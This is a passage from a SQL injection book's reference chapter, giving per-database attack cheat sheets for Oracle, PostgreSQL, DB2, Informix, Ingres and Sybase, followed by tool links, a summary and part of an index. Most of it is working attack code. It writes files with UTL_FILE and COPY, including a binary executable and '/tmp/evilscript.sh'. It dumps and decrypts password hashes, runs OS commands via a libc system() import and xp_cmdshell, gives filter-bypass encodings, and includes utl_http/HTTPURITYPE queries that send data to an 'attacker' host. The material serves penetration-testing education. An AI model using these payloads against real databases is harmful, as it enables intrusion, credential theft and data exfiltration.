\n∗ via external table  \nCREATE TABLE products_ext  \n(prod_id NUMBER, prod_name VARCHAR2(50), prod_desc VARCHAR2(4000),  \nprod_category VARCHAR2(50), prod_category_desc VARCHAR2(4000), list_price  \nNUMBER(6,2), min_price NUMBER(6,2), last_updated DATE)  \n  ORGANIZATION EXTERNAL  \n ( \n TYPE oracle_loader  \n DEFAULT DIRECTORY stage_dir  \n ACCESS PARAMETERS  \n (RECORDS DELIMITED BY NEWLINE  \n  BADFILE ORAHOME:‘.rhosts’  \n  LOGFILE ORAHOME:‘log_products_ext’  \n  FIELDS TERMINATED BY ‘,’  \n  MISSING FIELD VALUES ARE NULL  \n  (prod_id, prod_name, prod_desc, prod_category, prod_category_desc, price, \nprice_delta,last_updated char date_format date mask “dd- mon-yyyy”)  \n ) \n LOCATION (‘data.txt’)  \n ) \n PARALLEL 5  \n REJECT LIMIT UNLIMITED;  \nWriting Local Files (PL/SQL Injection Only)  \nThe following code examples will successfully execute only as PL/SQL blocks. In most cases, \nyou will need  a direct connection to the database via a client such as SQL ∗Plus.  \nWriting local text files: utl_file  \nCreate or replace directory ext AS ‘C: \\’; \nDECLARE  \n v_file UTL_FILE.FILE_TYPE;  \nBEGIN  \nv_file:= UTL_FILE.FOPEN(‘EXT’,‘aht.txt’, ‘w’);  \n UTL_FILE.PUT_LINE(v_file,‘first row’);  \n UTL_FILE.NEW_LINE (v_file);  \n UTL_FILE.PUT_LINE(v_file,‘second row’);  \n UTL_FILE.FCLOSE(v_file);  \nEND; \nWriting Local Binary files: utl_file  \nCreate or replace directory ext AS ‘C: \\’; \nDECLARE fi UTL_FILE.FILE_TYPE;  \nbu RAW(32767);  \nBEGIN  \nbu:=hextoraw(‘BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C402CD20C35589E5B8010050\n8D451A50B80F00508D5D00FFD383C40689EC5DC3558BEC8B5E088B4E048B5606B80040CD21730231C08BE55DC3\n9048656C6C6F2C20576F726C64210D0A’);  \nfi:=UTL_FILE.fopen(‘EXT’,‘hello.com’,‘ wb’,32767);  \nUTL_FILE.put_raw(fi,bu,TRUE);  \nUTL_FILE.fclose(fi);  \nEND; \n/ \nWriting Local Files: dbms_advisor (Oracle 10g and later)  \ncreate directory MYDIR as ‘C:\\ ’; \nexec SYS.DBMS_ADVISOR.CREATE_FILE (‘This is the content’||chr(13)||‘Next line’, ‘MYDIR’, \n‘myfile.txt’);  \nCracking Database Passwords  \nDepending on the version of the database, you can extract password hashes from the database \nby executing one of the following queries:  \nSELECT name, password FROM sys.user$ where type#>0 and length(password)=16;  \n--DES Hashes (7- 10g) \nSELECT name, spare4 FROM sys.user$ where type#>0 and length(spare4)=62;  \n--SHA1 Hashes  \nMore than 100 Oracle tables (depending on the installed components) contain password \ninformation. Sometimes the passwords are available as clear text. The fol lowing examples will \nattempt to extract clear -text passwords:  \nselect view_username, sysman.decrypt(view_password) from sysman.mgmt_view_user_credentials;  \nselect credential_set_column, sysman.decrypt(credential_value) from \nsysman.mgmt_credentials2;  \nselect sysman.decrypt(aru_username), sysman.decrypt(aru_password) from \nsysman.mgmt_aru_credentials;  \nOracle password hashes can then be cracked using a variety of freely available tools, such as \nWorauthbf, John the Ripper, Gsaauditor, Checkpwd, and Cain & A bel. See the resources \nsection at the end of this chapter for links to download each tool.  \nPostgreSQL Cheat Sheet  \nPostgreSQL is an open source database available for most operating system platforms. To \ndownload a comprehensive user manual visit www.postgresql.org/docs/manuals/ . \nEnumerating Database Configuration Information and Schema  \nTable 11.19  lists SQL statements used to extract key configuration inf ormation. Table 11.20  \nlists the SQL statements used to enumerate schema information.  \nTable 11.19  Extracting the PostgreSQL Database Configuration Information  \nData  Query \nVersion  SELECT version()  \nCurrent user  SELECT getpgusername();  \nSELECT user;  \nSELECT current_user;  \nSELECT session_user;  \nList users  SELECT usename FROM pg_user  \nCurrent user privileges  SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user  \nData  Query \nDatabase server host name  SELECT inet_server_addr();  \nTable 11.20  Extracting the PostgreSQL Database Schema  \nData  Query \nCurrent database  SELECT current_database();  \nList databases  SELECT datname FROM pg_database;  \nList tables  SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN  \npg_catalog.pg_namespace n ON n.oid = \nc.relnamespace  \nWHERE c.relkind IN (‘r’,’’)  \nAND pg_catalog.pg_table_is_visible(c.oid)  \nAND n.nspname NOT IN (‘pg_catalog’, \n‘pg_toast’);  \nList columns  SELECT relname,A.attname FROM pg_class C,  \npg_namespace N, pg_attribute A, pg_type T WHERE  \n(C.relkind=‘r’) AND (N.nspname = ‘public’)  \nAND (A.attrelid=C.oid) AND (N.oid=C.relnamespace)  \nAND (A.atttypid=T.oid) AND(A.attnum>0)  \nAND (NOT A.attisdropped);  \nBlind SQL Injection F unctions: PostgreSQL  \nTable 11.21 lists functions that are useful when performing blind SQL injection attacks. \nTable 11.21  Blind SQL Injection Functions  \nData  Query \nData  Query \nString length  LENGTH()  \nExtract substring from a given string  SUBSTRING(string,offset,length)  \nString ( ‘ABC’ ) representation with no single \nquotes  SELECT CHR(65)||CHR(66)||CHR(67);  \nTrigger time delay  SELECT pg_sleep(10);  \n-- Triggers a 10 second pause on version 8.2 \nand above  \nAttacking the Database Server: PostgreSQL  \nPostgreSQL does not offer a built -in procedure for executing operating system commands. \nHowever, it is possible to import functions such as system()  from an ex ternal .dll or Shared \nObject (.so) file. It is also possible to read local files via PostgreSQL using the COPY  \nstatement.  \nSystem Command Execution \nFor PostgreSQL database servers prior to version 8.2, you can use the following SQL to import \nthe system func tion from the standard UNIX libc library:  \nCREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6’,  \n‘system’ LANGUAGE ‘C’ STRICT;  \nThe system function can then be called by executing the following SQL query:  \nSELECT system(‘command’);  \nCurrent versions of PostgreSQL require that external libraries be compiled with the \nPostgreSQL PG_MODULE_MAGIC  macro defined. To achieve code execution via this \nmethod you will need to upload your own shared .so or .dll file with the appropriate \nPG_MODULE_ MAGIC  macro enabled. See the following resource for further information:  \n• www.postgresql.org/docs/8.2/static/xfunc -c.html#XFUNC -C-DYNLOAD  \nLocal File Access  \nLocal files can be read by the superuser account using the following SQL. Files are opened using the operating -system -level PostgreSQL user account:  \nCREATE TABLE filedata(t text);  \nCOPY filedata FROM ‘/etc/passwd’; -- \nIt is also possible to write local file s using the following SQL. Files are created using the \noperating -system -level PostgreSQL user account:  \nCREATE TABLE thefile(evildata text);  \nINSERT INTO thefile(evildata) VALUES (‘some evil data’);  \nCOPY thefile (evildata) TO ‘/tmp/evilscript.sh’;  \nCracking D atabase Passwords  \nPostgreSQL passwords are hashed using the MD5 algorithm. The username is appended to the password before hashing takes place and the resultant hash has the characters md5  prepended \nto it. The following SQL query will list usernames and pa ssword hashes from a PostgreSQL \ndatabase:  \nselect usename||‘:’||passwd from pg_shadow;  \nAn example entry for user sqlhacker  is as follows:  \nsqlhacker:md544715a9661408abe727f9963bf6dad93  \nA number of password cracking tools support MD5 hashes, including MDCrack, John the \nRipper, and Cain & Abel. \n \nBypassing input validation filters  \nYou frequently can bypass input validation filters that rely on rejecting known bad characters \nand string literals by encoding your input. This section provides a reference of the most common encoding techniques used to bypass input validation filters that operate in this way.  \nQuote Filters  \nThe single -quote character (‘) is synonymous with SQL injection attacks. As such, the single -\nquote character is often filtered or doubled up as a def ense mechanism. The idea behind this \napproach is to prevent the attacker from breaking out of quote -delimited data. Unfortunately, \nthis strategy fails when the vulnerable user input is a numeric value, and therefore is not delimited using quote characters.  \nWhen quote characters are being filtered or sanitized you will need to encode string values \nto prevent them from being corrupted by the filter. Table 11.22 lists the alternative methods for \nrepresenting the query SELECT ‘ABC’  within each of the most popular database platforms. \nTable 11.22  Representing Strings Without Quote Characters  \nPlatform  Query \nMicrosoft SQL \nServer  SELECT char(0x41) + char(0x42) + char(0x43);  \nMySQL \nServer  SELECT char(65,66,67);  \nSELECT 0x414243;  \nOracle  SELECT chr(65) || chr(66) || chr(67) from dual;  \nSelect concat(chr(65),concat(chr(66),chr(67))) from dual;  \nSelect upper((select \nsubstr(banner,3,1)||substr(banner,12,1)||substr(banner,4,1) from v$version \nwhere rownum=1)) from dual;  \nPostgreSQL  SELECT chr(65)||chr(66)||char(67);  \nMicrosoft SQL Server also allows you to build your query within a variable and then call \nEXEC  to execute it. In the following example, we have created a variable named @q and \nplaced the query SELECT  ‘ABC ’ into it via a HEX -encoded string:  \nDECLARE @q varchar(8000)  \nSELECT @q=0x53454c454354202741424327  \nEXEC(@q)  \nYou can adopt this technique to execute any query without submitting any quote characters \nto the application. You can use the following Perl script to automatically encode SQL \nstatements using this technique: \n#!/usr/bin/perl  \nprint “Enter SQL query to encode:”;  \n$teststr=<STDIN>;chomp $teststr;  \n$hardcoded_sql =  \n  ‘declare @q varchar(8000)’.  \n  ‘select @q=0x∗∗∗’ . \n  ‘exec(@q)’;  \n  $prepared = encode_sql($teststr);  \n $hardcoded_sql =∼ s/\\∗\\∗\\∗/$prepared/g;  \nprint “\\ n[∗]-Encoded SQL:\\ n\\n”; \nprint $hardcoded_sql .“ \\n”; \nsub encode_sql{  \n  @subvar=@_;  \n  my $sqlstr =$subvar[0];  \n  @ASCII = unpack(“C ∗”, $sqlstr);  \n  foreach $line (@ASCII) {  \n   $encoded = sprintf(‘%lx’,$line);  \n   $encoded_command .= $encoded;  \n    } \nreturn $encoded_command;  \n} \nHTTP Encoding  \nYou can sometimes bypass input validation fi lters that reject known bad characters (often \nreferred to as blacklisting) by encoding your input using exotic encoding standards or via \ndouble encoding. Table 11.23 lists common SQL metacharacters in a number of encod ed \nformats.  \nTable 11.23  Encoded SQL Metacharacters  \nCharacter  Encoded Variant s \n‘ %27 \n%2527  \n%u0027  \n%u02b9  \n%ca%b9  \n“ %22 \n%2522  \n%u0022  \n%uff02  \n%ef%bc%82  \n; %3b \n%253b  \n%u003b  \n%uff1b  \nCharacter  Encoded Variant s \n%ef%bc%9b  \n( %28 \n%2528  \n%u0028  \n%uff08  \n%ef%bc%88  \n) %29 \n%2529  \n%u0029  \n%uff09  \n%ef%bc%89  \n[SPACE]  %20 \n%2520  \n%u0020  \n%ff00  \n%c0%a0  \nTroubleshooting SQL injection attacks  \nTable 11.24 lists some of the common challenges and errors that are frequently encountered \nwhen attempting to exploit a SQL injection flaw across various platforms . \nTable 11.24  Troubleshooting SQL Injection Reference  \nError/Challenge Solutio n \nChallenge  \nPerforming a UNION SELECT  \nattack where the original query is \nretrieving a column of type image  \nError Message  \nImage is incompatible with int /  \nThe image data type cannot be \nselected as DISTINCT because it Change your UNION SELECT  stateme nt to read UNION \nALL SELECT . This resolves the problem with UNION \nSELECT  attempting to perform a compare operation \nagainst an image data type.For example:  \nUNION ALL SELECT null, null, null  \nError/Challenge Solutio n \nis not comparable.  \nChallenge  \nInjecting into an ORDER BY  clause \nYour injected data is being placed to \nthe right -hand side of an ORDER \nBY clause. Many of the usual \ntricks such as UNION SELECT  \nwill be unsuccessful.  \nIn this example, the following SQL \nquery is being executed where \nthe attacker’s data is your injection point:  \nSELECT ∗ FROM \nproducts GROUP BY  \nattackers_data DESC  Microsoft SQL Server  \nMicrosoft SQL Server supports stacked queries using the \nsemicolon character (;) to begin each new query. A variety of attacks, such as time -delay -based data \nretrieval and the execution of extended s tored \nprocedures, can be conducted in this way.  \nORDER BY 1; EXEC master..xp_cmdshell  \n‘cmd’  \nMicrosoft SQL Server can also be exploited to return query \nresult data via error messages. When injecting into an ORDER BY  clause the following syntax can be used:  \nORDER BY (1/(@@version));  \n-- return the version  \nORDER BY 1/(SELECT TOP 1 name FROM  \nsysobjects WHERE xtype=‘U’);  \n-- Return name from sysobjects  \nMySQL Server  \nTime -delay -based blind SQL injection techniques can be \nused within an ORDER BY  clause. The following \nexample will trigger a time delay if the current user is root@localhost : \nORDER BY(IF((SELECT user()=  \n‘root@localhost’),sleep(2),1));  \nOracle  \nThe utl_http package can be used to establish outbound \nHTTP connections over any Transmission Control Protocol (TCP) port of the attacker’s choosing. The following ORDER BY  clause establishes an HTTP \nconnection over port 1000 to the host attacker; the \nHTTP request contains the Oracle version banner within \nthe request path:  \nORDER BY utl_http.request(‘http://attacker:1000/ ’||(SELECT  \nbanner FROM v$version WHERE  \nError/Challenge Solutio n \nrownum=1))  \nThe following ORDER BY  clause will raise an error \ncontaining the Oracle version banner:  \nORDER BY utl_inaddr.get_host_name  \n((select banner from v$ version where  \nrownum=1))  \nPostgreSQL  \nPostgreSQL can be exploited to return query result data via \nerror messages. When injecting into an ORDER BY  \nclause the following syntax can be used:  \nORDER BY (SELECT CAST((SELECT version())::text as \nNumeric))  \nChallen ge \nUtl_http does not work because the \npublic privilege was removed. \nError Message  \nORA -00904 invalid identifier  Many Oracle security guides recommend that the public \nprivilege be removed from the utl_http package. \nHowever, many overlook the fact that the object type \nHTTPURITYPE can be used to achieve the same aim \nand is also accessible to public. \nSELECT HTTPURITYPE(  \n‘http://attacker:1000/ ’|| (SELECT  \nbanner FROM v$version WHERE rownum=1)  \n).getclob() FROM dual  \nChallenge  \nUtl_inaddr does not work. There \ncould be various reasons, such as \naccess control lists (ACLs) in Version 11, privileges have been revoked, and Java is not installed.\n \nError Message  \nORA -00904 invalid identifier  \nORA -24247 network access denied \nby ac cess control list (ACL) – \n11g Use a different function where you can control the content \nof the error message. Here is a small list of candidates depending on the database version and its installed components:  \nORDER BY  \nORDSYS.ORD_DICOM.GETMAPPINGXPATH((  \nSELECT banner FROM v$version WHERE  \nrownum=1),null,null)  \nORDER BY  \nSYS.DBMS_AW_XML.READAWMETADATA((  \nSELECT banner FROM v$version WHERE  \nrownum=1),null)  \nORDER BY CTXSYS.DRITHSX.SN((SELECT  \nbanner FROM v$version WHERE  \nrownum=1),user)  \nORDER BY  \nCTXSYS.CTX_REPORT.TOKEN_TYPE(user,  \nError/Challenge Solutio n \nORA -29540 \noracle/plsql/net/InternetAddress  (SELECT banner FROM v$version WHERE  \nrownum=1))  \nChallenge  \nYou receive an “illegal mix of \ncollations” message when \nperforming a UNION SELECT  \nattack against a MySQL database.  \nError Message  \nIllega l mix of collations \n(latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,SYSCONST) for operation ‘UNION’  This error can be overcome using the CAST  function. \nFor example:  \nUNION SELECT user(),null,null;  \nbecomes:  \nUNION SELECT CAST(user() AS  \nchar),null,null;  \nChallenge  \nYou receive a “collation conflict” \nmessage when performing a UNION SELECT  attack against a \nMicrosoft SQL Server database.  \nError Message  \nCannot resolve collation conflict for \ncolumn 2 in SELECT statement.  One way to overcome this error is to rea d the Collation  \nproperty from the database and then use it within the query. In the following example, we are performing a UNION ALL SELECT  query to retrieve the name \ncolumn from the sysobjects  table.  \nStep 1: Retrieve the collation value  \nUNION ALL SELECT  \nSERVERPROPERTY(‘Collation’),null FROM  \nsysobjects  \nIn this example, the Collation  property is set to \nSQL_Latin1_General_CP1_CI_AS. \nStep 2: Implement the collation value within the UNION \nSELECT  \nUNION ALL SELECT 1,Name collate  \nSQL_Latin1_General_CP1_CI_AS,null  \nFROM sysobjects  \nSQL injection on other platforms  \nThis book focuses on the four most popular databases: Microsoft SQL Server, MySQL, Oracle, \nand PostgreSQL. This section is intended to provide a quick reference for other, less common platforms, such as DB2, Informix, and Ingres.  \nDB2 Cheat Sheet  \nThe DB2 database server from IBM was historically an uncommon database platform to find integrated with a Web application, however the Linux, Unix and Windows edition (DB2 LUW) is becoming increasingly popular. As such, if you do encounter a SQL injection flaw within a DB2 -based application this section will help you exploit it.  \nEnumerating Database Configuration Information and Schema  \nTable 11.25  lists SQL statements used to extract key configuration information. Table 11.26  \nlists the SQL statements used to enumerate schema information.  \nTable 11.25  Extracting DB2 Database Configuration Information  \nData  Query \nVersion  SELECT versionnumber, version_timestamp FROM  \nsysibm.sysversions;  \nCurrent user  SELECT user FROM sysibm.sysdummy1;  \nSELECT session_user FROM sysibm.sysdummy1;  \nSELECT system_user FROM sysibm.sysdummy1;  \nList users  SELECT grantee FROM syscat.dbauth;  \nCurrent user privileges  SELECT ∗ FROM sysc at.dbauth WHERE grantee =user;  \nSELECT ∗ FROM syscat.tabauth WHERE grantee \n=user;  \nSELECT ∗ FROM syscat.tabauth;  \nTable 11.26  Extracting DB2 Database Schema  \nData  Query \nCurrent database  SELECT current server FROM sysibm.sysdummy1;  \nList databases  SELECT schemaname FROM syscat.schemata;  \nList tables  SELECT name FROM sysibm.systables;  \nList columns  SELECT name, tbname, coltype FROM sysibm.syscolumns;  \nBlind SQL Injection Functions: DB2  \nTable 11.27 lists functions that are useful when performing blind SQL injection attacks. \nTable 11.27  Blind SQL Injection Functions  \nData  Query \nString length  LENGTH()  \nExtract substring from a given string  SUBSTRING(string,offset,length) FROM \nsysibm.sysdummy1;  \nString ( ‘ABC’ ) representation with no single \nquotes  SELECT CHR(65)||CHR(66)||CHR(67);  \nInformix Cheat Sheet  \nThe Informix database server is distributed by IBM and is not commonly encountered when \ncompared to other database platforms. The following reference should help if you encounter an \nInformix server in the wild. \nEnumerating Database Configuration Information and Schema  \nTable 11.28  lists SQL statements used to extract key configuration information. Table 11.29  \nlists the SQL statements used to enumerate schema information.  \nTable 11.28  Extracting Informix Database Configuration Information  \nData  Query \nVersion  SELECT DBINFO(‘version’, ‘full’) FROM systables WHERE  \ntabid = 1;  \nCurrent user  SELECT USER FROM systables WHERE tabid = 1;  \nList users  select usertype,username, password from sysusers;  \nCurrent user privileges  select tabname, tabauth, grantor, grantee FROM  \nsystabauth join systables on systables.tabid =  \nsystabauth.tabid  \nDatabase server host name  SELECT DBINFO(‘dbhostname’) FROM systables WHERE  \ntabid=1;  \nTable 11.29  Extracting Informix Database Schema  \nData  Query \nCurrent database  SELECT DBSERVERNAME FROM systables WHERE tabid = 1;  \nList databases  SELECT name, owner FROM sysdatabases;  \nList tables  SELECT tabname FROM systables;  \nSELECT tabname, viewtext FROM sysviews join \nsystables  \nData  Query \non systables.tabid = sysviews.tabid;  \nList columns  SELECT tabname, colname, coltype FROM  \nsyscolumns join systables on syscolumns.tabid =  \nsystables.tabid;  \nBlind SQL Injection Functions: Informix  \nTable 11.30 lists fu nctions that are useful when performing blind SQL injection attacks. \nTable 11.30  Blind SQL Injection Functions  \nData  Query \nString length  LENGTH()  \nExtract substring from a given string  SELECT SUBSTRING(‘ABCD’ FROM 4 FOR 1) FROM systables \nwhere tabid = 1;  \n-- returns ‘D’  \nString ( ‘ABC’ ) representation with no \nsingle quotes  SELECT CHR(65)||CHR(66)||CHR(67) FROM systables where \ntabid = 1;  \nIngres Cheat Sheet  \nThe Ingres database is an open source database available for all major operating systems. \nIngres is one of the least popular databases to find integrated with a Web application. For further information and Ingres tutorials see http://ariel.its.unimelb.edu.au/~yuan/ingres.html. \nEnumerating Database Configuration Information and Schema  \nTable 11.31  lists SQL statements used to extract key configuration infor mation. Table 11.32  \nlists the SQL statements used to enumerate schema information.  \nTable 11.31  Extracting Ingres Database Configuration Information  \nData  Query \nVersion  SELECT dbmsinfo(‘_version’);  \nCurrent user  SELECT dbmsinfo(‘system_user’);  \nSELECT dbmsinfo(‘session_user’);  \nList users  SELECT name, password FROM iiuser;  \nCurrent user privileges  SELECT dbmsinfo(‘select_syscat’);  \nSELECT dbmsinfo(‘db_privileges’);  \nSELECT \ndbmsinfo(‘current_priv_mask’);  \nSELECT dbmsinfo(‘db_admin’);  \nSELECT dbmsinfo(‘security_priv’);  \nSELECT dbmsinfo(‘create_table’);  \nSELECT \ndbmsinfo(‘create_procedure’);  \nTable 11.32  Extracting Ingres Database Configuration  \nData  Query \nCurrent database  SELECT dbmsinfo(‘database’);  \nList tables  SELECT relid, relowner, relloc FROM iirelation WHERE  \nrelowner != ‘$ingres’;  \nList columns  SELECT column_name, column_datatype, table_name,  \ntable_owner FROM iicolumns;  \nBlind SQL Injection Functions: Ingres  \nTable 11.33 lists functions that are useful when performing blind SQL injection attacks. \nTable 11.33  Blind SQL Injection Functions  \nData  Query \nString length  LENGTH();  \nExtract substring from a given string  SELECT substr(string, offset, length); --  \nString ( ‘ABC’ ) representation with no single quotes  SELECT chr(65)||chr(66)||chr(67);  \nSybase Cheat Sheet  \nSybase and Microsoft SQL Server share a common heritage, and as such many of the \napproaches used with Microsoft SQL Server will also work with Sybase, often with little or no changes to the syntax of the commands to use.  \nEnumerating Database Configuration Information and Schema  \nTable 11.34  lists SQL statements used to extract key configuration information. Table 11.35  \nlists the SQL statements used to enumerate schema information.  \nTable 11.34  Extracting Sybase Database Configuration Information  \nData  Query \nVersion  SELECT @@version;  \nCurrent user  SELECT username();  \nSELECT suser_name();  \nSELECT user;  \nList users  SELECT name FROM master..syslogins;  \nData  Query \nCurrent user privileges  SELECT show_role();  \nEXEC sp_helprotect <user>;  \nTable 11.35  Extracting Sybase Database Schema  \nData  Query \nCurrent database  SELECT db_name();  \nList databases  SELECT name FROM master..sysdatabases;  \nList tables  Tables within the current database:  \nSELECT name FROM sysobjects WHERE type=‘U’;  \nSELECT name FROM sysobjects WHERE type=‘V’;-- Views  \nTables within the master  database:  \nSELECT name FROM master..sysobjects WHERE type=‘U’;  \nSELECT name FROM master..sysobjects WHERE type=‘V’;  \nList columns  Column names for the tblUsers table within the current database:  \nSELECT name FROM syscolumns WHERE id=object_id(‘tblUsers’);  \nColumn names for the tblUsers table within the admin  database:  \nSELECT name FROM admin..syscolumns WHERE id=object_id(‘admin..tblUsers’);  \nBlind SQL Injection Functions: Sybase  \nTable 11.36 lists functions that are useful when performing blind SQL injection attacks. \nTable 11.36  Blind  SQL Injection Functions  \nData  Query \nString length  LEN();  \nExtract substring from a given string  SUBSTRING(string,offset,length);  \nString ( ‘ABC’ ) representation with no single quotes  SELECT char(65) + char(66) + char(67);  \nMicrosoft Access  \nMicrosoft Access databases do not scale well with enterprise applications, and therefore are \nusually encountered only when the application has minimal database requirements. Brett Moore of insomniasec.com  has publ ished an excellent paper on SQL injection with Microsoft \nAccess which you can find here:  \n• www.insomniasec.com/publications/Access -Through- Access.pdf  \nResources  \nThis section provides a list of links to further reading materials and tools to assist you in discovering, exploiting, and preventing SQL injection vulnerabilities. \nSQL Injection White Papers  \n• “Advanced SQL Injection” by Victor Chapela:  \nwww.owasp.org/index.php/Image:Advanced_SQL_Injection.ppt  \n• “Advanced SQL Injection in SQL Server Applications” by Chris Anley:  \nwww.ngssoftware.com/papers/advanced_sql_injection.pdf  \n• “Buffer Truncation Abuse in .NET and Microsoft SQL Server” by Gary O’Leary -Steele:  \nhttp://scanner.sec -1.com/resources/bta.pdf  \n• “Access through Access” by Brett Moore:  \nwww.insomniasec.com/publications/Access -Through -Access.pdf  \n• “Time -Based Blind SQL Injection with Heavy Queries” by Chema Alonso:  \nhttp://technet.microsoft.com/en -us/library/cc512676.aspx \nSQL Injection Cheat Sheets  \n• PentestMonkey.com  SQL injection cheat sheets for Oracle, Micros oft SQL Server, MySQL, \nPostgreSQL, Ingres, DB2, and Informix:  \nhttp://pentestmonkey.net/cheat- sheets/  \n• Michaeldaw.org SQL injection cheat sheets for Sybase, MySQL, Oracle, PostgreSQL, DB2, \nand Ingres:  \nhttp://michaeldaw.org/sql- injection -cheat -sheet/  \n• Ferruh Mavituna cheat sheets for MySQL, SQL Server, PostgreSQL, and Oracle:  \nhttp://ferruh.mavituna.com/sql -injection -cheatsheet -oku/ \n• Ferruh Mavituna cheat sheets for Oracle:  \nhttp://ferruh.mavituna.com/oracle -sql-injection -cheat -sheet -oku/ \nSQL Injection Exploit Tools  \n• Absinthe is a Windows GUI -based exploit tool that supports Microsoft SQL Server, Oracle, \nPostgreSQL, and Sybase using both blind and error -based SQL injection:  \nwww.0x90.org/releases/absinthe/  \n• SQLBrute is a time - and error -based blind SQL injection tool that supports Microsoft SQL \nServer and Oracle:  \nhttps: //github.com/GDSSecurity/SQLBrute  \n• Bobcat is a Windows GUI -based tool that supports Microsoft SQL Server exploitation:  \nhttp://web.mac.com/nmonkee/pub/bobcat.html  \n• BSQL Hacker is a relatively new player in the SQL injection exploit world. The tool is a \nWindows -based GUI application that supports Microsoft SQL Server, Oracle, and MySQL. \nBSQL Hacker supports blind and error -based SQL injection techniques:  \nhttp://labs.portcullis.co.uk/application/bsql -hacker/  \n• SQLMap is considered by many to be the best SQL injection exploit tool currently available:  \nhttp://sqlmap.sourceforge.net/  \n• Sql ninja is a Microsoft SQL injection tool focused on gaining code execution and written in \nPerl:  \nhttp://sqlninja.sourceforge.net/  \n• Squeeza was released as part of a BlackHat presentation. It focuses on altern ative \ncommunication channels. Squeeza supports Microsoft SQL Server:  \nwww.sensepost.com/research/squeeza/  \nPassword Cracking Tools  \n• Cain & Abel:  \nwww.oxid.it  \n• Wora uthbf:  \nwww.soonerorlater.hu/index.khtml?article_id=513 \n• Checkpwd:  \nwww.red -database- security.com/software/checkpwd.html  \n• John the Ripper:  \nwww.openwall.com/john/  \nSolutions fast track  \nStructured Query Language (SQL) Primer  \n• SQL comprises a feature- rich set of statements, operators, and clauses designed to interact \nwith a database server. The most common SQL statements are SELECT , INSERT , UPDATE , \nDELETE, and DROP . The majority of SQL injection vulnerabilities occur when user -\nsupplied data is included with the WHERE clause portion of a SELECT  statement.  \n• The UPDATE and DELETE statements rely on a WHERE  clause to determine which records \nare modified or deleted. Whe n injecting SQL into either an UPDATE  or a DELETE  \nstatement it is important to understand how your input could affect the database. Avoid \ninjecting OR 1=1  or any other condition that returns true  into either of these statements.  \n• The UNION  operator is use d to combine the results of two or more SELECT  statements. \nUNION SELECT  is frequently used to exploit SQL injection vulnerabilities.  \nSQL Injection Quick Reference  \n• Identifying the database platform is an important step when attempting to exploit a SQL \ninjection vulnerability. Triggering a measurable time delay is a reliable method of accurately \nidentifying the database platform.  \n• When exploiting SQL injection vulnerabilities you are often restricted to returning one \ncolumn from one row at a time. You can overcome this restriction by concatenating the \nresults from multiple columns and rows into a single string.  \nBypassing Input Validation Filters  \n• You often can circumvent input validation filters that are designed to handle the single -quote \ncharacter (‘) by  representing string values using character functions. For example, \nchar(65,66,67)  is equivalent to ‘ABC’  on Microsoft SQL Server.  \n• HTTP encoding variants such as Unicode and Overlong UTF -8 can sometimes be used to \nbypass input validation filters. \n• Input  validation filters that rely on rejecting known bad data, often referred to as blacklisting, \nare frequently flawed.  \nTroubleshooting SQL Injection Attacks  \n• When exploiting a SQL injection flaw using UNION SELECT  you may encounter type clash \nerrors when im age data type columns are included within the original query. To overcome \nthis common obstacle use UNION ALL SELECT . \n• Microsoft SQL Server supports stacked queries using the semicolon character to begin each \nnew query.  \n• The Oracle Database Server includes the utl_http package that you can use to establish \noutbound HTTP connections from the database server host. It is possible to abuse this package to extract database data via HTTP connections to any TCP port.  \nSQL Injection on Other Platforms  \n• The most co mmonly encountered database platforms are Microsoft SQL Server, Oracle, and \nMySQL. This chapter included a SQL injection cheat sheet for DB2, Informix, and Ingres databases.  \nIndex  \nA \nabstract syntax tree (AST), 127 \nAndroid application code  \nContent -Providers, 111–112, 115, 116 \nparameterized statements, 378 SQLiteDatabase, 112–114 SQLiteQueryBuilder, 112–114 sqlma p, 112–114 \nWebContentResolver, 112 \napplication program interfaces (APIs), 371  \nAspect -oriented progra mming (AOP), 424  \nAsprox Botnet, 73–74 AST. See abstract syntax tree (AST)  \nautomated source code review  \nabstract syntax tree (AST), 127 AppCodeScan, 130  \nAppScan Source Edition, 135 CodePro AnalytiX, 132  \nCodeSecure, 135  \ncommand -line utilities, 126–127 \ncontrol flow graph (CFG), 127 \nKlocwork Solo, 135–136 \nlexical analysis, 127  \nMicrosoft analyzer, 131  \nMicrosoft code analysis tool .NET (CAT.NET), 131–132 mysql_query( ) function, 127 OWASP LAPSE+ project, 130–131 PHP scripts, vulnerabilities in, 132 Pixy, 129–130  \nRIPS, 132 source code analyzers (SCAs), 133–134 static analysis, 134–135 \nTeachable Static Analysis Workbench (TeSA), 132–133 yet another source code analyzer (YASCA), 129  \nautomated SQL injection discovery  \ndatabase error, 76 \nGET and POST requests, 76 HP Scrawlr, 80–82  \nHP WebInspect  \nauthentication mechanisms, 77 Hewlett -Packard, 77  \ntesting string, 78  \nIBM Rational AppScan, 79–80 \nParos Proxy, 83–85  \nSQLiX, 82–83  \ntasks, 76 \nZed Attack Proxy, 83–85  \nautomated techniques  \nabsinthe  \nconfiguration tab, 277  \nGPL tool, 276  \ninjectable parameter, 277 –278 \nBSQL hacker  \nextracting database login, 280 features, 278 request and injection tab, 279 selecting database plugin, 280 URL textbox, 279  \nSQLBrute  \nFALSE statement, 281 python interpreter, 281  \nsqlninja  \nextraction of username, 284 SQL server installations, 283 \nuploading DNS helper, 284 \nsqueeza \nDNS channel, 284–285, 285–286 \nGET and POST parameters, 286  \nB \nBCP. See bulk copy program (BCP)  \nblind SQL inje ction techniques  \nchannels, 249  \ninference techniques  \nASCII( ) function, 244  \nbit string, 248 \nbitwise operations, 247 \nextracting data method, 243–244 one bit information, 239 SQL Server database, 240 status parameter, 242  \nSUBSTRING( ) function, 242–243 T-SQL, 247  \ninteger value, 248  \nBobcat, 225–226  \nBSQL  \nactive session, 227  \ndatabases, 226  \nremote database, 228  \nbuilt-in stored procedures, 371 \nbulk copy program (BCP), 311 \nbypassing input validation filters  \nHTTP encoding, 521, 522 quote filters, 520–521 \nC \nC# applications  \ncoding behavior recognition, 98–99 dangerous functions, 103–104 data process, 110–111  \ncanonicalization approaches  \nASCII equivalents, 397 \nframework, 398  \ninput normalization, 397  \ninput  validity, 398  \nnormalization process, 397 working with Unicode input, 397–399 \nCAT.NET. See Microsoft  code analysis tool .NET (CAT.NET)  \nchannels  \ndatabase connections  \nOPENROWSET command, 267, 268 \nPL/pgSQL functions, 269 \ntransmission control protocol (TCP), 267 \nDNS exfiltration  